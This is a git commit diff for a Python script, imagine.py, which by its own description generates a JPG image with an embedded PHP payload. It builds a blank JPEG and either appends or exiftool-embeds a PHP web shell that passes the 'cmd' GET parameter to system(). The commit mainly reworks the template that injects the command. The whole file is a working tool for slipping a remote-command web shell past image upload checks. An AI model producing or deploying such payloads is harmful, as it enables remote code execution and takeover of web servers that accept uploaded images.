7ff401bd4a1f93b76b50b2bd017dbc5ef92fefad
dsabau <danioansabau@icloud.com>
2025-09-20 12:56:42 +0300

    [bugfix] Removed ' arround the command within the template

--- imagine.py
+++ imagine.py
@@ -1,33 +1,29 @@
-import io
-import logging
 import tempfile
 import argparse
 import subprocess
+
+from io import BytesIO
 from pathlib import Path
 
 from PIL import Image
 
 
-logging.basicConfig(
-    format="[%(levelname)s]\t%(filename)s:%(lineno)d - %(funcName)s - %(message)s"
-)
-
+COMMAND_PLACEHOLDER = f'{{COMMAND}}'
 DEFAULT_TEMPLATE = \
-"""
+f"""
 <div style="background:#f4f4f4;color:#333;padding:10px;font-family:monospace;font-size:14px;">
-  <strong>Command executed:</strong><br>
-  <pre style="background:#1e1e1e;color:#f5f5f5;padding:10px;border-radius:4px;overflow:auto;">{{COMMAND}}</pre>
-  <br>
-  <strong>Command output:</strong><br>
-  <pre style="background:#1e1e1e;color:#f5f5f5;padding:10px;border-radius:4px;overflow:auto;">{{OUTPUT}}</pre>
+    <strong>Command executed:</strong><br>
+    <pre style="background:#1e1e1e;color:#f5f5f5;padding:10px;border-radius:4px;overflow:auto;"><?php echo htmlspecialchars({COMMAND_PLACEHOLDER}); ?></pre>
+    <br>
+    <strong>Command output:</strong><br>
+    <pre style="background:#1e1e1e;color:#f5f5f5;padding:10px;border-radius:4px;overflow:auto;"><?php system({COMMAND_PLACEHOLDER}); ?></pre>
 </div>
 """
 
 
 def parse_command_line_arguments() -> argparse.Namespace:
-    parser = argparse.ArgumentParser(
-        description="Generate a JPG image with embedded PHP payload."
-    )
+    parser = argparse.ArgumentParser(description="Generate a JPG image with embedded PHP payload.")
+
     parser.add_argument("-t", "--template", help="Path to custom template file.")
     parser.add_argument("-c", "--command", help="Linux command to embed within the template.", default="$_GET['cmd']")
     parser.add_argument("-s", "--size", nargs=2, type=int, metavar=("WIDTH", "HEIGHT"), default=(100, 100),
@@ -39,24 +35,19 @@ def parse_command_line_arguments() -> argparse.Namespace:
     return parser.parse_args()
 
 
-def load_template(template_path: Path) -> str:
-    return template_path.read_text(encoding="utf-8")
-
-
-def raise_error_if_template_misses_placeholders(template: str) -> None:
-    for placeholder in ["{{COMMAND}}", "{{OUTPUT}}"]:
-        if placeholder not in template:
-            raise ValueError(f"Template must contain {placeholder}")
+def load_template(template_path: str) -> str:
+    return Path(template_path).read_text(encoding="utf-8")
 
 
 def populate_template(template: str, command: str) -> str:
-    return template \
-        .replace("{{COMMAND}}", f"<?php echo htmlspecialchars({command}); ?>") \
-        .replace("{{OUTPUT}}", f"<?php system('{command}'); ?>")
+    if COMMAND_PLACEHOLDER not in template:
+        raise ValueError(f"Template must contain {COMMAND_PLACEHOLDER}")
+
+    return template.replace(COMMAND_PLACEHOLDER, command)
 
 
 def create_in_memory_jpeg(size: tuple[int, int]) -> bytes:
-    with io.BytesIO() as buf:
+    with BytesIO() as buf:
         Image.new("RGB", size, "white").save(buf, format="JPEG")
         return buf.getvalue()
 
@@ -79,14 +70,14 @@ def embed_with_exiftool(image_data: bytes, payload: str, output_file_path: Path)
 
 
 def embed_inline(image_data: bytes, payload: str, output_file_path: Path) -> None:
-    output_file_path.write_bytes(image_data + b"\n" + payload.encode("utf-8"))
+    output_file_path.write_bytes(image_data + payload.encode("utf-8"))
 
 
 def main() -> None:
     args = parse_command_line_arguments()
 
-    template = load_template(Path(args.template)) if args.template else DEFAULT_TEMPLATE
-    raise_error_if_template_misses_placeholders(template)
+    template = load_template(args.template) \
+        if args.template else DEFAULT_TEMPLATE
 
     (embed_with_exiftool if args.use_exiftools else embed_inline)(
         image_data=create_in_memory_jpeg(args.size),
